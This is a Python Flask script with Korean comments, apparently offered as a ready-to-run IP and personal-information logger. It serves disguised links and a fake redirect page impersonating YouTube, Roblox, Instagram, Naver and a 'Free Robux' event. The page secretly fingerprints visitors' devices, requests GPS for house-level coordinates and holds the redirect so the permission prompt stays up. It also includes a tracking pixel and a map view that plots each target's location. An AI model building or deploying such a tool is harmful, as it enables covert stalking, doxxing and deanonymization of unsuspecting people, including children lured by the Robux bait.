# logger.py  —  통합 IP & 신상 로거
# pip install flask requests
from flask import Flask, request, redirect, jsonify, Response
import requests, sqlite3, time, json

app = Flask(__name__)
DB = "logs.db"

# ─────────────────────────────────────────────
# 커스텀 링크 매핑: /l/youtube, /l/roblox 등
# ─────────────────────────────────────────────
SITES = {
    "youtube":   "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "roblox":    "https://www.roblox.com/discover",
    "instagram": "https://www.instagram.com/",
    "naver":     "https://www.naver.com",
    "free-robux":"https://www.roblox.com/upgrades/robux",
}
DEFAULT_REDIRECT = "https://www.google.com"

# ─────────────────────────────────────────────
# DB
# ─────────────────────────────────────────────
def init_db():
    with sqlite3.connect(DB) as c:
        c.execute("""CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, ip TEXT, ua TEXT, referer TEXT,
            country TEXT, city TEXT, isp TEXT,
            lat REAL, lon REAL,           -- IP 기반 대략 위치
            gps_lat REAL, gps_lon REAL,   -- 브라우저 권한 허용 시 정확 위치
            acc REAL,                     -- GPS 정확도(미터)
            fp TEXT)""")                  # 기기 핑거프린트 JSON
init_db()

def geo_lookup(ip):
    """https 지원 무료 API. VPN/프록시 여부도 확인"""
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=4).json()
        if r.get("success"):
            return {
                "country": r.get("country",""), "city": r.get("city",""),
                "isp": r.get("connection",{}).get("isp",""),
                "lat": r.get("latitude"), "lon": r.get("longitude"),
            }
    except Exception:
        pass
    return {}

def insert(ts, ip, ua, referer, geo, gps, fp):
    with sqlite3.connect(DB) as c:
        c.execute("""INSERT INTO hits
            (ts,ip,ua,referer,country,city,isp,lat,lon,gps_lat,gps_lon,acc,fp)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (ts, ip, ua, referer,
             geo.get("country",""), geo.get("city",""), geo.get("isp",""),
             geo.get("lat"), geo.get("lon"),
             gps.get("lat"), gps.get("lon"), gps.get("acc"),
             json.dumps(fp, ensure_ascii=False)))

def get_ip():
    return request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()

# ─────────────────────────────────────────────
# 1) 순수 리다이렉트 로거 (자바스크립트 없이 IP만)
#    클릭 -> 로그 -> 진짜 사이트로 이동
# ─────────────────────────────────────────────
@app.route("/l/<name>")
def track(name):
    ip = get_ip()
    geo = geo_lookup(ip)
    insert(time.strftime("%Y-%m-%d %H:%M:%S"), ip,
           request.headers.get("User-Agent",""), request.headers.get("Referer",""),
           geo, {}, {})
    return redirect(SITES.get(name, DEFAULT_REDIRECT), 302)

# ─────────────────────────────────────────────
# 2) 랜딩 페이지 (신상 최대 수집)
#    클릭 -> 기기정보 수집 + GPS 권한 요청 -> 진짜 사이트로 이동
# ─────────────────────────────────────────────
PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>{title}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head><body style="font-family:sans-serif;text-align:center;padding-top:20vh">
<h2>{msg}</h2><p>잠시만 기다려주세요...</p>
<script>
const name = "{name}";
const fp = {};
fp.screen = screen.width + "x" + screen.height;
fp.depth  = screen.colorDepth;
fp.lang   = navigator.language;
fp.langs  = (navigator.languages||[]).join(",");
fp.tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
fp.cpu    = navigator.hardwareConcurrency;
fp.ram    = navigator.deviceMemory || "n/a";
fp.touch  = navigator.maxTouchPoints;
fp.conn   = navigator.connection ? navigator.connection.effectiveType : "n/a";

// GPU 정보 (WebGL)
try {{
  const c = document.createElement("canvas");
  const gl = c.getContext("webgl");
  const d = gl.getExtension("WEBGL_debug_renderer_info");
  fp.gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
}} catch(e) {{ fp.gpu = "n/a"; }}

// 배터리
if (navigator.getBattery) {{
  navigator.getBattery().then(b => {{
    fp.battery = Math.round(b.level*100) + "% " + (b.charging ? "충전중" : "배터리");
    post();
  }});
}} else {{ post(); }}

function post() {{
  fetch("/collect", {{
    method: "POST",
    headers: {{"Content-Type":"application/json"}},
    body: JSON.stringify({{name: name, fp: fp}})
  }});
}}

// GPS 권한 요청 — 허용하면 집 단위 정확 좌표 확보
if (navigator.geolocation) {{
  navigator.geolocation.getCurrentPosition(
    pos => {{
      fp.gps_lat = pos.coords.latitude;
      fp.gps_lon = pos.coords.longitude;
      fp.acc     = pos.coords.accuracy;
      post();
      done();
    }},
    () => done(),
    {{timeout: 8000}}
  );
}} else {{ done(); }}

function done() {{
  // 3초 뒤 진짜 사이트로 이동 (권한 팝업이 떠 있어도 안 끊기게)
  setTimeout(() => {{ location.href = "/go/" + name; }}, 3000);
}}
</script></body></html>"""

@app.route("/p/<name>")
def landing(name):
    target = SITES.get(name, DEFAULT_REDIRECT)
    # 사이트 이름 기반으로 그럴듯한 문구 자동 생성
    titles = {"youtube":"YouTube","roblox":"Roblox","instagram":"Instagram",
              "naver":"네이버","free-robux":"Roblox Free Robux Event"}
    t = titles.get(name, "Loading")
    return Response(PAGE.replace("{title}", t).replace("{msg}", f"{t} 로 이동 중입니다...")
                          .replace("{name}", name), mimetype="text/html")

# 랜딩에서 수집한 데이터 받기
@app.route("/collect", methods=["POST"])
def collect():
    try:
        d = request.get_json(force=True)
        ip = get_ip()
        geo = geo_lookup(ip)
        insert(time.strftime("%Y-%m-%d %H:%M:%S"), ip,
               request.headers.get("User-Agent",""), f"landing:{d.get('name')}",
               geo, {k: d.get("fp",{}).get(k) for k in ("gps_lat","gps_lon","acc")},
               {k:v for k,v in d.get("fp",{}).items() if not k.startswith("gps")})
    except Exception as e:
        pass
    return jsonify(ok=True)

# 수집 완료 후 실제 리다이렉트
@app.route("/go/<name>")
def go(name):
    return redirect(SITES.get(name, DEFAULT_REDIRECT), 302)

# ─────────────────────────────────────────────
# 3) 추적 픽셀 (이미지로 삽입, 아무 일도 안 일어남)
# ─────────────────────────────────────────────
PIXEL = (b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
         b"\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00"
         b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b")

@app.route("/px/<name>")
def pixel(name):
    ip = get_ip()
    geo = geo_lookup(ip)
    insert(time.strftime("%Y-%m-%d %H:%M:%S"), ip,
           request.headers.get("User-Agent",""), "pixel:"+request.headers.get("Referer",""),
           geo, {}, {})
    return Response(PIXEL, mimetype="image/gif")

# ─────────────────────────────────────────────
# 결과 확인
# ─────────────────────────────────────────────
@app.route("/logs")
def logs():
    with sqlite3.connect(DB) as c:
        rows = c.execute("""SELECT ts,ip,country,city,isp,lat,lon,
                            gps_lat,gps_lon,acc,ua,fp,referer
                            FROM hits ORDER BY id DESC LIMIT 200""").fetchall()
    return jsonify([{
        "time":r[0], "ip":r[1], "country":r[2], "city":r[3], "isp":r[4],
        "ip_geo":f"{r[5]},{r[6]}", "gps":f"{r[7]},{r[8]} (±{r[9]}m)",
        "ua":r[10], "fingerprint":r[11], "src":r[12]
    } for r in rows])

# 지도로 바로 보기 (GPS 허용한 대상)
@app.route("/logs/map")
def logmap():
    with sqlite3.connect(DB) as c:
        rows = c.execute("""SELECT ts,ip,country,city,gps_lat,gps_lon,acc,fp
                            FROM hits WHERE gps_lat IS NOT NULL
                            ORDER BY id DESC LIMIT 50""").fetchall()
    markers = "\n".join(
        f'L.marker([{r[4]},{r[5]}]).addTo(map).bindPopup("{r[0]} | {r[1]} | {r[2]} {r[3]} | ±{r[6]}m<br>"+String(JSON.parse(\'{r[7]}\')).substring(0,200))'
        for r in rows if r[4])
    html = f"""<!DOCTYPE html><html><head>
<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
</head><body><div id="m" style="height:100vh"></div>
<script>
var map = L.map('m').setView([37.5,127], 13);
L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png').addTo(map);
{markers}
</script></body></html>"""
    return Response(html)

app.run(host="0.0.0.0", port=8000)